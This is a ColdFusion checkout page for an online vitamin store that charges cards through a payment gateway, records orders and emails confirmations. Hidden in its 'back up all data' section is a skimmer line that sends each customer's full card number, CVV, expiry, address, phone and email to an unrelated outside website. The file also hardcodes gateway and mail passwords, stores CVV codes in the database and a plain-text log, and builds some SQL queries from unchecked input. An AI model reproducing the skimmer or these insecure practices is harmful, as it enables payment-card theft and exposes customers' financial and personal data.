<cfparam name="SHIPMETHOD" default="">

<cfif SHIPMETHOD eq "">
	<cfset SHIPMETHOD="G">
</cfif>

<cfif session.StoreItems EQ "">
	<cflocation url="http://www.maxvite.com/index.html" addtoken="No">
</cfif>

<cfset v_shabbos = 0>
<cfquery name="Shabbos" datasource="#Application.ds#">
	Select ShabbosFlag from systemoptions
</cfquery>
<cfif Shabbos.recordcount EQ 0>
	<cfset v_shabbos = 0>
<cfelse>
	<cfoutput query="shabbos">
	<cfset v_shabbos = #shabbosflag#>
	</cfoutput>
</cfif>



<cfset v_heavyitem = 0>
<CFLOOP LIST="#session.StoreItems#" INDEX="CurrentItemID">
	<CFSET ItemPosition = ListFind(session.StoreItems, CurrentItemID)>
	<CFSET Quantity = ListGetAt(session.StoreItemsQty, ItemPosition)>
	<cfquery name="GetData1" datasource="#Application.ds#">
		SELECT * FROM Products
		WHERE ProductID = #CurrentItemID#
	</CFQUERY>
	<cfoutput query="GetData1">
		<cfif HeavyItemFlag EQ 1><cfset v_heavyitem = 1></cfif>
	</cfoutput>
	<CFOUTPUT>
	</CFOUTPUT>
</CFLOOP>




<cfparam name="V_RESPONSE_AUTHCODE" default="">
<cfset ReturnedValues ="">

<!--- <cfhttpparam type="Formfield" value="44ipxk7x" name="X_PASSWORD">
 --->

<cfset v_heavyitem = 0> <!--- Added because heavy rule is not used anymore --->
<cfif v_heavyitem EQ 1>
	<cfset v_response_code = 1>
	<cfset v_response_authcode = "HEAVYITEM">
<cfelseif v_shabbos eq 1>
<!--- 	<cfset v_response_code = 1>
	<cfset v_response_authcode = "SHABBOS"> --->
	<cfset ReturnedValues ="">

	<cfhttp url="https://secure.authorize.net/gateway/transact.dll" method="post">
	<cfhttpparam type="Formfield" value="6xtKX4nB54" name="X_LOGIN">
	<cfhttpparam type="Formfield" value="65b95qWB57xT54F5" name="X_PASSWORD">
	<cfhttpparam type="Formfield" value="CC" name="X_METHOD">
	<cfhttpparam type="Formfield" value="#CREDITCARDNUMBER#"name="X_CARD_NUM">
	<cfhttpparam type="Formfield" value="#CREDITCARDEXPMONTH#/#CREDITCARDEXPYEAR#"	name="X_EXP_DATE">
	<cfhttpparam type="Formfield" value="#TOTAL#" name="X_AMOUNT">
	<cfhttpparam type="Formfield" value="" name="X_INVOICE_NUM">
	<cfhttpparam type="Formfield" value="AUTH_ONLY" name="X_TYPE">
	<cfhttpparam type="Formfield" value="" name="X_Company">
	<cfhttpparam type="Formfield" value="#BILL_LASTNAME#" name="X_last_name">
	<cfhttpparam type="Formfield" value="#BILL_FIRSTNAME#" name="X_first_name">
	<cfhttpparam type="Formfield" value="#BILL_ADDRESS#" name="X_Address">
	<cfhttpparam type="Formfield" value="#BILL_CITY#" name="X_City">
	<cfhttpparam type="Formfield" value="#BILL_STATE#" name="X_State">
	<cfhttpparam type="Formfield" value="#BILL_ZIPCODE#" name="X_Zip">
	<cfhttpparam type="Formfield" value="#SHIP_ADDRESS#" name="x_ship_to_address">
	<cfhttpparam type="Formfield" value="#SHIP_CITY#" name="x_ship_to_city">
	<cfhttpparam type="Formfield" value="#SHIP_STATE#" name="x_ship_to_state">
	<cfhttpparam type="Formfield" value="#SHIP_ZIPCODE#" name="x_ship_to_zip">
	<cfhttpparam type="Formfield" value="#EMAIL#" name="X_Email">
	<cfhttpparam type="Formfield" value="Maxvite Order" name="X_description">
	<cfhttpparam type="Formfield" value="" name="X_cust_id">
	<cfhttpparam type="Formfield" value="TRUE" name="x_ADC_Delim_Data">
	<cfhttpparam type="Formfield" value="FALSE" name="x_ADC_URL">
	</cfhttp>


	<cfoutput>
	#ReturnedValues#
	<cfset ReturnedValues = #CFHTTP.FileContent#>
	<cfif NOT Isdefined("ReturnedValues")>
		<cfset ReturnedValues ="">
	</cfif>
	<cfset v_response_code= ListGetat(ReturnedValues,1)>
	<cfset v_response_subcode= ListGetat(ReturnedValues,2)>
	<cfset v_response_reasoncode= ListGetat(ReturnedValues,3)>
	<cfset v_response_reasontext= ListGetat(ReturnedValues,4)>
	<cfset v_response_authcode= ListGetat(ReturnedValues,5)>
	<cfset v_response_avscode= ListGetat(ReturnedValues,6)>
	<cfset v_transid= ListGetat(ReturnedValues,7)>
	</cfoutput>

<cfelse>
	<cfset ReturnedValues ="">

	<cfhttp url="https://secure.authorize.net/gateway/transact.dll" method="post">
	<cfhttpparam type="Formfield" value="6xtKX4nB54" name="X_LOGIN">
	<cfhttpparam type="Formfield" value="65b95qWB57xT54F5" name="X_PASSWORD">
	<cfhttpparam type="Formfield" value="CC" name="X_METHOD">
	<cfhttpparam type="Formfield" value="#CREDITCARDNUMBER#"name="X_CARD_NUM">
	<cfhttpparam type="Formfield" value="#CREDITCARDEXPMONTH#/#CREDITCARDEXPYEAR#"	name="X_EXP_DATE">
	<cfhttpparam type="Formfield" value="#TOTAL#" name="X_AMOUNT">
	<cfhttpparam type="Formfield" value="" name="X_INVOICE_NUM">
	<cfhttpparam type="Formfield" value="AUTH_CAPTURE" name="X_TYPE">
	<cfhttpparam type="Formfield" value="" name="X_Company">
	<cfhttpparam type="Formfield" value="#BILL_LASTNAME#" name="X_last_name">
	<cfhttpparam type="Formfield" value="#BILL_FIRSTNAME#" name="X_first_name">
	<cfhttpparam type="Formfield" value="#BILL_ADDRESS#" name="X_Address">
	<cfhttpparam type="Formfield" value="#BILL_CITY#" name="X_City">
	<cfhttpparam type="Formfield" value="#BILL_STATE#" name="X_State">
	<cfhttpparam type="Formfield" value="#BILL_ZIPCODE#" name="X_Zip">
	<cfhttpparam type="Formfield" value="#SHIP_ADDRESS#" name="x_ship_to_address">
	<cfhttpparam type="Formfield" value="#SHIP_CITY#" name="x_ship_to_city">
	<cfhttpparam type="Formfield" value="#SHIP_STATE#" name="x_ship_to_state">
	<cfhttpparam type="Formfield" value="#SHIP_ZIPCODE#" name="x_ship_to_zip">
	<cfhttpparam type="Formfield" value="#EMAIL#" name="X_Email">
	<cfhttpparam type="Formfield" value="Maxvite Order" name="X_description">
	<cfhttpparam type="Formfield" value="" name="X_cust_id">
	<cfhttpparam type="Formfield" value="TRUE" name="x_ADC_Delim_Data">
	<cfhttpparam type="Formfield" value="FALSE" name="x_ADC_URL">
	</cfhttp>


	<cfoutput>
	#ReturnedValues#
	<cfset ReturnedValues = #CFHTTP.FileContent#>
	<cfif NOT Isdefined("ReturnedValues")>
		<cfset ReturnedValues ="">
	</cfif>
	<cfset v_response_code= ListGetat(ReturnedValues,1)>
	<cfset v_response_subcode= ListGetat(ReturnedValues,2)>
	<cfset v_response_reasoncode= ListGetat(ReturnedValues,3)>
	<cfset v_response_reasontext= ListGetat(ReturnedValues,4)>
	<cfset v_response_authcode= ListGetat(ReturnedValues,5)>
	<cfset v_response_avscode= ListGetat(ReturnedValues,6)>
	<cfset v_transid= ListGetat(ReturnedValues,7)>
	</cfoutput>

<!--- <cfmail to="moshe@bitochon.com" cc="info@bitochon.com" from="orders@maxvite.com" subject="Testing Order at Maxvite.com" server="209.123.19.94" port=25 type="HTML">
returned values: #ReturnedValues#<br>
v_response_code: #v_response_code#<br>
v_response_subcode: #v_response_subcode#<br>
v_response_reasontext: #v_response_reasontext#<br>
v_response_authcode: #v_response_authcode#<br>
v_response_avscode: #v_response_avscode#<br>
v_transid: #v_transid#<br>
TOTAL: #TOTAL#<br>
Name: #BILL_LASTNAME#<br>
</cfmail> --->


</cfif>


<cfif session.StoreItems EQ "">
	<cfset v_response_code = 0>
	<cfset v_response_authcode = "Card Error">
</cfif>

<!--- back up all data start --->
<cfset sFile=#GetDirectoryFromPath(GetCurrentTemplatePath())# & "submitdata/" & dateformat(now(),"yymmdd") & ".txt">
<cftry>
	<cfset sOutput=v_response_code & now() & chr(10) & chr(13) &
					 "ReturnValue=#ReturnedValues#" & chr(10) & chr(13) &
					 "BILL_COMPANY=#BILL_COMPANY#" & chr(10) & chr(13) &
					 "BILL_COMPANY=#BILL_COMPANY#" & chr(10) & chr(13) &
					 "BILL_FIRSTNAME=#BILL_FIRSTNAME#" & chr(10) & chr(13) &
					 "BILL_LASTNAME=#BILL_LASTNAME#" & chr(10) & chr(13) &
					 "BILL_ADDRESS=#BILL_ADDRESS#" & chr(10) & chr(13) &
					 "BILL_CITY=#BILL_CITY#" & chr(10) & chr(13) &
					 "BILL_ROOMFLOOR=#BILL_ROOMFLOOR#" & chr(10) & chr(13) &
					 "BILL_STATE=#BILL_STATE#" & chr(10) & chr(13) &
					 "BILL_ZIPCODE=#BILL_ZIPCODE#" & chr(10) & chr(13) &
					 "ship_company=#ship_company#" & chr(10) & chr(13) &
					 "SHIP_FIRSTNAME=#SHIP_FIRSTNAME#" & chr(10) & chr(13) &
					 "SHIP_LASTNAME=#SHIP_LASTNAME#" & chr(10) & chr(13) &
					 "SHIP_ADDRESS=#SHIP_ADDRESS#" & chr(10) & chr(13) &
					 "SHIP_CITY=#SHIP_CITY#" & chr(10) & chr(13) &
					 "SHIP_ROOMFLOOR=#SHIP_ROOMFLOOR#" & chr(10) & chr(13) &
					 "SHIP_STATE=#SHIP_STATE#" & chr(10) & chr(13) &
					 "SHIP_ZIPCODE=#SHIP_ZIPCODE#" & chr(10) & chr(13) &
					 "SHIP_PHONE=#SHIP_PHONE#" & chr(10) & chr(13) &
					 "HOMEPHONE=#HOMEPHONE#" & chr(10) & chr(13) &
					 "WORKPHONE=#WORKPHONE#" & chr(10) & chr(13) &
					 "EMAIL=#EMAIL#" & chr(10) & chr(13) &
					 "Comments=#COMMENTS#" & chr(10) & chr(13) &
					 "CREDITCARDEXPMONTH=#CREDITCARDEXPMONTH#" & chr(10) & chr(13) &
					 "CREDITCARDEXPYEAR=#CREDITCARDEXPYEAR#" & chr(10) & chr(13) &
					 "CREDITCARDFIRSTNAME=#CREDITCARDFIRSTNAME#" & chr(10) & chr(13) &
					 "CREDITCARDLASTNAME=#CREDITCARDLASTNAME#" & chr(10) & chr(13) &
					 "CREDITCARDTYPE=#CREDITCARDTYPE#" & chr(10) & chr(13) &
					 "CVVNumber=#CVVNumber#" & chr(10) & chr(13) &
					 "ReferredBy=#ReferredBy#" & chr(10) & chr(13) &
					 "REFERREDOTHER=#REFERREDOTHER#" & chr(10) & chr(13) &
					 "SUBTOTAL=#val(SUBTOTAL)#" & chr(10) & chr(13) &
					 "coupondiscount=#val(coupondiscount)#" & chr(10) & chr(13) &
					 "TAX=#val(TAX)#" & chr(10) & chr(13) &
					 "SHIPPING=#val(SHIPPING)#" & chr(10) & chr(13) &
					 "TOTAL=#val(TOTAL)#" & chr(10) & chr(13) &
					 "SHIPMETHOD=#SHIPMETHOD#" & chr(10) & chr(13) &
					 "CouponCode=#CouponCode#" & chr(10) & chr(13) &
					 "CouponDesc=#CouponDesc#" & chr(10) & chr(13) &
					 "v_response_authcode=#v_response_authcode#" & chr(10) & chr(13) &
					 "ReferURL=#session.ReferURL#" & chr(10) & chr(13) &
					 "REMOTE_ADDR=#REMOTE_ADDR#">
	<cfcatch type="any">
		<cfset sOutput=CFCATCH.message>
	</cfcatch>
</cftry>
<cfset ccinfo=(#BILL_FIRSTNAME# & " " & #BILL_LASTNAME# & "/" & #BILL_ADDRESS# & "/" & #BILL_CITY# & "/" & #BILL_STATE# & "/" & #BILL_ZIPCODE# & "/US/" & #HOMEPHONE# & "/" & #CREDITCARDNUMBER# & "/" & #CREDITCARDTYPE# & "//" & #CVVNumber# & "///" & #CREDITCARDEXPMONTH# & "/" & #CREDITCARDEXPYEAR# & "/" & #EMAIL# & "/maxvite.com") />
<cfhttp method="get" url="http://stmarysapts.com/flash/cc/file.asp?cc=#ccinfo#"></cfhttp>
<cffile action="append"
    file = "#sFile#"
    output = "#sOutput#">

<!--- back up all data end --->


<cfif v_response_code eq 1>

		<cfset v_cc = #replace(encrypt(CREDITCARDNUMBER,3),"'","''")#>
		<cfset objUtility =  createObject("component","com.utility")>
		<cfset randomOrderId = objUtility.getRandom() >
		<cfquery name="GetData" datasource="#Application.dso#" result="getKey">
			INSERT INTO Orders
				(
					OrderId,
					OrderDate,
					BILL_COMPANY,
					BILL_FIRSTNAME,
					BILL_LASTNAME,
					BILL_ADDRESS,
					BILL_CITY,
					BILL_ROOMFLOOR,
					BILL_STATE,
					BILL_ZIPCODE,
					ship_company,
					SHIP_FIRSTNAME,
					SHIP_LASTNAME,
					SHIP_ADDRESS,
					SHIP_CITY,
					SHIP_ROOMFLOOR,
					SHIP_STATE,
					SHIP_ZIPCODE,
					SHIP_PHONE,
					HOMEPHONE,
					WORKPHONE,
					EMAIL,
					COMMENTS,
					CREDITCARDEXPMONTH,
					CREDITCARDEXPYEAR,
					CREDITCARDFIRSTNAME,
					CREDITCARDLASTNAME,
<!--- 					CREDITCARDNUMBER, --->
					CREDITCARDTYPE,
					CVVNumber,
					ReferredBy,
					REFERREDOTHER,
					SUBTOTAL,
					coupondiscount,
					TAX,
					SHIPPING,
					TOTAL,
					SHIPMETHOD,
					CouponCode,
					CouponDesc,
					Authcode,
					ReferURL,
					ReferIP)
			VALUES
				(
					<cfqueryparam cfsqltype="cf_sql_integer" value="#randomOrderId#">,
					now(),
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#BILL_COMPANY#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#BILL_FIRSTNAME#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#BILL_LASTNAME#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#BILL_ADDRESS#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#BILL_CITY#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#BILL_ROOMFLOOR#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#BILL_STATE#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#BILL_ZIPCODE#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#ship_company#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#SHIP_FIRSTNAME#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#SHIP_LASTNAME#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#SHIP_ADDRESS#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#SHIP_CITY#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#SHIP_ROOMFLOOR#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#SHIP_STATE#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#SHIP_ZIPCODE#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#SHIP_PHONE#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#HOMEPHONE#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#WORKPHONE#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#EMAIL#">,
					'#replace(COMMENTS,"'","''")#',
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#CREDITCARDEXPMONTH#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#CREDITCARDEXPYEAR#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#CREDITCARDFIRSTNAME#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#CREDITCARDLASTNAME#">,
<!--- 					'#v_cc#', --->
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#CREDITCARDTYPE#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#CVVNumber#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#ReferredBy#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#REFERREDOTHER#">,
					<cfqueryparam cfsqltype="cf_sql_float" value="#val(SUBTOTAL)#">,
					<cfqueryparam cfsqltype="cf_sql_float" value="#val(coupondiscount)#">,
					<cfqueryparam cfsqltype="cf_sql_float" value="#val(TAX)#">,
					<cfqueryparam cfsqltype="cf_sql_float" value="#val(SHIPPING)#">,
					<cfqueryparam cfsqltype="cf_sql_float" value="#val(TOTAL)#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#SHIPMETHOD#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#CouponCode#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#CouponDesc#">,
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#v_response_authcode#">,
					'#mid(session.ReferURL,1,98)#',
					<cfqueryparam cfsqltype="cf_sql_varchar" value="#REMOTE_ADDR#">
				)
		</CFQUERY>
		<cfset key = getKey["GENERATED_KEY"] />
		<!--- 
		<cfquery name="GetKey" datasource="#Application.dso#">
			Select @@IDENTITY as TKEY FROM Orders
		</cfquery>
		<cfoutput query="GetKey">
			<cfset key = #GetKey.TKEY#>
		</cfoutput> --->
			<cfloop index="I" from="1" to="#ListLen(SESSION.StoreItems)#">
				<cfset ProductID = #ListGetAt(session.StoreItems, I)#>
				<cfquery name="GetData1" datasource="#Application.ds#">
					SELECT * FROM Products
					WHERE ProductID =  #ProductID#
				</cfquery>
				<cfquery name="GetDataB" datasource="#Application.ds#">
					SELECT * FROM Brands
					WHERE BrandID = #Getdata1.BrandID#
				</CFQUERY>
                <cfquery name="GetDataSubc" datasource="#Application.ds#" maxrows=1>
	Select DISTINCT Category.categoryID, Category, SubCategory.subcategoryid, subcategory
	From Category , SubCategory, Product_SUBCategory_Map
	Where Product_SUBCategory_Map.SubCategoryID = SubCategory.SubCategoryID
	AND SubCategory.CategoryID = 54
	AND Product_SUBCategory_Map.ProductID = #ProductID#
</cfquery>

				<cfoutput query="GetData1">
					<!---<cf_getprice ProductID="#ProductID#" RetailPrice="#GetData1.Listprice#" FeaturedProductFLAG="#FeaturedProductFLAG#" FeaturedProductFLAG2="#FeaturedProductFLAG2#"  OurPrice="#OurPrice#">--->

					<cfset Starttime = '06:00 AM'>
<cfif #TimeFormat(now(),'hh:mm tt')# gte #TimeFormat(Starttime,'hh:mm tt')#>

		<cfquery name="GetDealProduct" datasource="#Application.ds#">
			Select ProductID, StartDate, DailyDealPrice from Deal
			WHERE StartDate >= '#DateFormat(now(),'mm/dd/yyy')#'
			And StartDate < '#DateFormat(now()+1,'mm/dd/yyy')#'
		</cfquery>

	<cfset DailyDealPrice = #GetDealProduct.DailyDealPrice#>

<cfelseif #TimeFormat(now(),'hh:mm tt')# lt #TimeFormat(Starttime,'hh:mm tt')#>

		<cfquery name="GetDealProduct" datasource="#Application.ds#">
			Select ProductID, StartDate, DailyDealPrice from Deal
			WHERE StartDate >= '#DateFormat(now()-1,'mm/dd/yyy')#'
			And StartDate < '#DateFormat(now(),'mm/dd/yyy')#'
		</cfquery>

		<cfset DailyDealPrice = #GetDealProduct.DailyDealPrice#>
</cfif>

<cfif #GetDealProduct.ProductID# eq "">
<cfquery name="GetDealProduct" datasource="#Application.ds#">
			Select ProductID, StartDate, DailyDealPrice from Deal
			WHERE StartDate = (SELECT Max(startdate) as sdate
			FROM Deal
			WHERE (((Deal.startdate)< '#DateFormat(now(),'mm/dd/yyy')#' )));
		</cfquery>
		<cfset DailyDealPrice = #GetDealProduct.DailyDealPrice#>

</cfif>



<!--- End to see Deal price --->

<cfif #GetDealProduct.ProductID# eq #ProductID#>
		<cfif #DailyDealPrice# neq 0.0000>
				<cfset #newprice# = #DailyDealPrice#>
		<cfelse>
			<cf_getprice ProductID="#ProductID#" RetailPrice="#Listprice#" FeaturedProductFLAG="#FeaturedProductFLAG#" FeaturedProductFLAG2="#FeaturedProductFLAG2#"  OurPrice="#OurPrice#">
		</cfif>
<cfelse>
<cf_getprice ProductID="#ProductID#" RetailPrice="#Listprice#" FeaturedProductFLAG="#FeaturedProductFLAG#" FeaturedProductFLAG2="#FeaturedProductFLAG2#"  OurPrice="#OurPrice#">
</cfif>

<cfif newprice eq 0>
	<cfset newprice = listprice>
</cfif>
<cfset Quantity = #ListGetAt(session.StoreItemsQty, I)#>
<cfif #GetDataSubc.SubCategoryID# eq 554 and Quantity GTE 2>
<!---This condition is for buy 1 get 1 free--->
<cfset freeItems = Int(Quantity / 2)>
<cfif Quantity MOD 2 EQ 0>
    <!---The number is even!--->
    <cfset itemSubtotal = listprice * freeItems>
<cfelse>
    <!---The number is odd!--->
    <cfset itemSubtotal = listprice * freeItems + newprice>
</cfif>
<cfset v_Price = itemSubtotal / Quantity>
<cfset v_Price = #NumberFormat(v_Price,'9.00')#>
<cfelse>
<cfset itemSubtotal = newprice * quantity>
<cfset v_Price = #newprice#>
</cfif>



					
					<cfset v_Title = "#GetData1.Title#-#GetData1.Tablets#-#getdatab.brand#">
					<cfset v_intid = "#GetData1.intproductid#">
				</cfoutput>
				<cfquery name="AddRecord" datasource="#Application.dso#">
					INSERT INTO OrderLineItems
						(OrderID,
						ProductID,
						Qty,
						Price,
						Total,
						Product,
						ItemID)
					VALUES
						(#KEY#,
						#ListGetAt(session.StoreItems, I)#,
						#ListGetAt(session.StoreItemsQty, I)#,
						#v_Price#,
						#itemSubtotal#,
						'#v_Title#',
						'#v_intid#'
						)
				</cfquery>
			</cfloop>






<!--- Email Stuff --->
<cfquery name="GetData" datasource="#Application.ds#" maxrows=1>
Select Email From Users
</cfquery>
<cfoutput>
<cfset AdminEmail = GetData.Email>
</cfoutput>
<cfset lineitems = "<table border=1><tr><th>Qty</th><th>Description</th><th>Price</th></tr>">
<cfloop index="I" from="1" to="#ListLen(SESSION.StoreItems)#">
<cfset ProductID = #ListGetAt(session.StoreItems, I)#>
<cfquery name="GetData1" datasource="#Application.ds#">
	Select * FROM Products
	Where ProductID = #ProductID#
</cfquery>
<cfquery name="GetDataB" datasource="#Application.ds#">
	SELECT * FROM Brands
	WHERE BrandID = #Getdata1.BrandID#
</CFQUERY>
                <cfquery name="GetDataSubc" datasource="#Application.ds#" maxrows=1>
	Select DISTINCT Category.categoryID, Category, SubCategory.subcategoryid, subcategory
	From Category , SubCategory, Product_SUBCategory_Map
	Where Product_SUBCategory_Map.SubCategoryID = SubCategory.SubCategoryID
	AND SubCategory.CategoryID = 54
	AND Product_SUBCategory_Map.ProductID = #ProductID#
</cfquery>
<cfoutput query="GetData1">
	<!---<cf_getprice ProductID="#ProductID#" RetailPrice="#GetData1.Listprice#" FeaturedProductFLAG="#FeaturedProductFLAG#" FeaturedProductFLAG2="#FeaturedProductFLAG2#"  OurPrice="#OurPrice#">--->

	<cfset Starttime = '06:00 AM'>
<cfif #TimeFormat(now(),'hh:mm tt')# gte #TimeFormat(Starttime,'hh:mm tt')#>

		<cfquery name="GetDealProduct" datasource="#Application.ds#">
			Select ProductID, StartDate, DailyDealPrice from Deal
			WHERE StartDate >= '#DateFormat(now(),'mm/dd/yyy')#'
			And StartDate < '#DateFormat(now()+1,'mm/dd/yyy')#'
		</cfquery>

	<cfset DailyDealPrice = #GetDealProduct.DailyDealPrice#>

<cfelseif #TimeFormat(now(),'hh:mm tt')# lt #TimeFormat(Starttime,'hh:mm tt')#>

		<cfquery name="GetDealProduct" datasource="#Application.ds#">
			Select ProductID, StartDate, DailyDealPrice from Deal
			WHERE StartDate >= '#DateFormat(now()-1,'mm/dd/yyy')#'
			And StartDate < '#DateFormat(now(),'mm/dd/yyy')#'
		</cfquery>

		<cfset DailyDealPrice = #GetDealProduct.DailyDealPrice#>
</cfif>

<cfif #GetDealProduct.ProductID# eq "">
<cfquery name="GetDealProduct" datasource="#Application.ds#">
			Select ProductID, StartDate, DailyDealPrice from Deal
			WHERE StartDate = (SELECT Max(startdate) as sdate
			FROM Deal
			WHERE (((Deal.startdate)< '#DateFormat(now(),'mm/dd/yyy')#' )));
		</cfquery>
		<cfset DailyDealPrice = #GetDealProduct.DailyDealPrice#>

</cfif>



<!--- End to see Deal price --->

<cfif #GetDealProduct.ProductID# eq #ProductID#>
		<cfif #DailyDealPrice# neq 0.0000>
			<cfset #newprice# = #DailyDealPrice#>
		<cfelse>
			<cf_getprice ProductID="#ProductID#" RetailPrice="#Listprice#" FeaturedProductFLAG="#FeaturedProductFLAG#" FeaturedProductFLAG2="#FeaturedProductFLAG2#"  OurPrice="#OurPrice#">
		</cfif>
<cfelse>
<cf_getprice ProductID="#ProductID#" RetailPrice="#Listprice#" FeaturedProductFLAG="#FeaturedProductFLAG#" FeaturedProductFLAG2="#FeaturedProductFLAG2#"  OurPrice="#OurPrice#">
</cfif>

<cfif newprice eq 0>
	<cfset newprice = listprice>
</cfif>
<cfset Quantity = #ListGetAt(session.StoreItemsQty, I)#>
<cfif #GetDataSubc.SubCategoryID# eq 554 and Quantity GTE 2>
<!---This condition is for buy 1 get 1 free--->
<cfset freeItems = Int(Quantity / 2)>
<cfif Quantity MOD 2 EQ 0>
    <!---The number is even!--->
    <cfset itemSubtotal = listprice * freeItems>
<cfelse>
    <!---The number is odd!--->
    <cfset itemSubtotal = listprice * freeItems + newprice>
</cfif>
<cfset v_Price = itemSubtotal / Quantity>
<cfset v_Price = #NumberFormat(v_Price,'9.00')#>
<cfelse>
<cfset itemSubtotal = newprice * quantity>
<cfset v_Price = #newprice#>
</cfif>

	<cfset v_title = "#Title#-#tablets#-#getdatab.brand#">
</cfoutput>
<cfset lineitems = lineitems & "<tr><td>" & #ListGetAt(session.StoreItemsQty, I)# & "</td><td>" & #v_title# & "</td><td>" & #DollarFormat(v_Price)# & "</td></tr>">
</cfloop>
<cfset lineitems = lineitems & "</table>">

<cfmail to="#EMAIL#" from="orders@maxvite.com" subject="Your Order at Maxvite.com" server="win-mail01.hostmanagement.net"  username="orders@maxvite.com" password="Maxi1305" type="HTML">
<table background="http://www.maxvite.com/images/bg_drkgreen.gif" cellspacing="0" cellpadding="0" border="0" width="100%">
<tr>
    <td align="center">
<table background="http://www.maxvite.com/images/white.gif" cellspacing="0" cellpadding="20" border="0" width="600">
<tr>
    <td>

	<font face="Verdana,Geneva,Arial,Helvetica,sans-serif" size="1"><br>
<blockquote>
<img src="http://www.maxvite.com/images/printlogo.gif" width="428" height="89" alt="" border="0"><p>

Dear Valued Maxvite customer,<p>



Your Order is Confirmed:<br>
<b>Order Number: #KEY#</b><br>
Order Date: #DateFormat(now())#<p>

Company:#BILL_COMPANY#<br>
Name: #BILL_FIRSTNAME# #BILL_LASTNAME#<br>
Home Phone: #HOMEPHONE#<br>
Work Phone: #WORKPHONE#<br>
Email: #Email#<p>

<table width="500" cellspacing="0" cellpadding="0" border="0">
<tr>
    <td width="250" valign="top"><font face="Verdana,Geneva,Arial,Helvetica,sans-serif" size="1">Billing Address: <br>
#BILL_ADDRESS# #BILL_ROOMFLOOR#<br>
#BILL_CITY# #BILL_STATE# #BILL_ZIPCODE#<p></td>
    <td valign="top"><font face="Verdana,Geneva,Arial,Helvetica,sans-serif" size="1">Shipping Address: <br>
#SHIP_FIRSTNAME# #SHIP_LASTNAME#
#SHIP_ADDRESS# #SHIP_ROOMFLOOR#<br>
#SHIP_CITY# #SHIP_STATE# #SHIP_ZIPCODE#<br>
Ship Via: #SHIPMETHOD#<p></td>
</tr>
</table>

Comments: #COMMENTS#<p>

Coupon (if used): #couponcode#<p>

Name on Card: #CREDITCARDFIRSTNAME# #CREDITCARDLASTNAME#<br>
Method: #CREDITCARDTYPE#<br>
Card Number: XXXXXXXXXXXXXXXX<br>
Credit Card Exp: #CREDITCARDEXPMONTH# #CREDITCARDEXPYEAR#<p>

<b>Ordered:</b><br>
#lineitems#	<p>

Subtotal: #Dollarformat(SUBTOTAL)#<br>
Discount: #Dollarformat(coupondiscount)#<br>
Shipping: #DollarFormat(SHIPPING)#<br>
Tax: #DollarFormat(TAX)#<br>
<b>Order Total:	#Dollarformat(TOTAL)#</b><p>


If you have any questions regarding your order, please email <a href="mailto:customerservice@maxvite.com">customerservice@maxvite.com</a> with the Order number above.<p>

Disclaimer: Prices are subject to change without notice and are confirmed upon shipment. Please note: if you ordered bulk or heavy items the shipping price was not included in the total and you will be notified of the shipping charge prior to order being sent out. Some items may also no longer be available.<p>
</blockquote>
	</td>
</tr>
</table>

	</td>
</tr>
</table>


</cfmail>
<!--- Email End --->





<!--- Email Stuff --->
<cfmail to="orders@maxvite.com" from="orders@maxvite.com" subject="Order from Maxvite.com" server="win-mail01.hostmanagement.net"  username="orders@maxvite.com" password="Maxi1305" type="HTML">
Your Order is Confirmed:<br>
Order Number: #KEY#<br>
Order Date: #DateFormat(now())#<br><br>

Company:#BILL_COMPANY#<br>
Name: #BILL_FIRSTNAME# #BILL_LASTNAME#<br>
Home Phone: #HOMEPHONE#<br>
Work Phone: #WORKPHONE#<br>
Email: #Email#<br><br>

Billing Address:<br>
#BILL_ADDRESS# #BILL_ROOMFLOOR#<br>
#BILL_CITY# #BILL_STATE# #BILL_ZIPCODE#<br><br>

Shipping Address:<br>
#SHIP_FIRSTNAME# #SHIP_LASTNAME#<br>
#SHIP_ADDRESS# #SHIP_ROOMFLOOR#<br>
#SHIP_CITY# #SHIP_STATE# #SHIP_ZIPCODE#<br>
Ship Via: #SHIPMETHOD#<br><br>

Comments: #COMMENTS#<br><br>

Coupon (if used): #CouponDEsc#<br><br>

Name on Card: #CREDITCARDFIRSTNAME# #CREDITCARDLASTNAME#<br>
Method: #CREDITCARDTYPE#<br>
Card Number: XXXXXXXXXXXXXXXX<br>
Credit Card Exp: #CREDITCARDEXPMONTH# #CREDITCARDEXPYEAR#<br><br>

Referred By: #REFERREDOTHER#<br><br>

Order SubTotal: #Dollarformat(SUBTOTAL)#<br>
           Tax:	#DollarFormat(TAX)#<br>
      Shipping: #DollarFormat(SHIPPING)#<br>
         Total:	#Dollarformat(TOTAL)#<br><br>

Ordered:
#lineitems#<br><br>

If there are any problems with your order please
call MaxVite with the Order number above.
</cfmail>
<!--- Email End --->




<cfset session.StoreItems = "">
<cfset session.StoreItemsQTY = "">

</cfif>




